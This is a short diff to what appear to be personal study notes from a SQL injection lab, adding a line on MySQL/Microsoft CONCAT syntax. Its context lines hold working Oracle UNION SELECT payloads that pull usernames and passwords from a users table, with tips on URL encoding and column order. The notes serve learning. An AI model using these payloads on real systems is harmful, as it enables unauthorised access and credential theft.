@@ -22,5 +22,6 @@ Oracle:
 '+UNION+SELECT+NULL,username||'~'||password+FROM+users--;  Browser and Works from repeater which is after browser
 ' UNION SELECT NULL, username||'~'||password FROM users--; Browser   Only Browser. URL has to get encoded by browser.
 You had to know string was second column and not the first. Lesson always generate a good select not with NULL if you are grabbing data. 
-
+Microsot / MYSQL:
+CONCAT ( string_value1, string_value2 [, string_valueN ] )
 
